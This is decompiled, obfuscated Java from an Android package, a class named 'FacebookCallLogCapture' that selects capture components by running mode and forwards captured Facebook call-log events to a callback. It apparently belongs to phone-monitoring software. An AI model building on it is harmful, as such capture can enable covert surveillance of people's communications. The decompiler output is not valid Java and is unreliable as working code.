package com.vvt.capture.b.c.a;

import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.e;
  private com.vvt.base.a c;
  private String d;
  private e e;
  private f f;
  
  public a(String paramString1, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, String paramString2)
  {
    this.d = paramString1;
    this.c = parama;
    Object localObject = RunningMode.LIMITED_1;
    if (paramRunningMode == localObject)
    {
      localObject = new com/vvt/capture/b/c/a/b/a;
      ((com.vvt.capture.b.c.a.b.a)localObject).<init>(paramString1, paramb, paramString2);
      this.e = ((e)localObject);
      localObject = new com/vvt/capture/b/c/a/b/b;
      ((com.vvt.capture.b.c.a.b.b)localObject).<init>(paramString1, paramString2);
      this.f = ((f)localObject);
    }
    for (;;)
    {
      return;
      localObject = RunningMode.FULL;
      if (paramRunningMode == localObject)
      {
        localObject = new com/vvt/capture/b/c/a/a/a;
        ((com.vvt.capture.b.c.a.a.a)localObject).<init>();
        this.e = ((e)localObject);
        localObject = new com/vvt/capture/b/c/a/a/b;
        ((com.vvt.capture.b.c.a.a.b)localObject).<init>();
        this.f = ((f)localObject);
      }
      else
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof com.vvt.capture.b.a;
      if (bool2)
      {
        localObject = b.a((com.vvt.capture.b.a)localObject);
        localArrayList.add(localObject);
      }
    }
    Object localObject = this.c;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = a;
        if (bool1) {}
        localObject = this.c;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
  }
  
  protected e b()
  {
    return this.e;
  }
  
  protected f c()
  {
    return this.f;
  }
  
  protected String d()
  {
    return "FacebookCallLogCapture";
  }
  
  protected String e()
  {
    return this.d;
  }
  
  protected String f()
  {
    return "facebook_calllog.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/MyUncaughtExceptionHandler/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */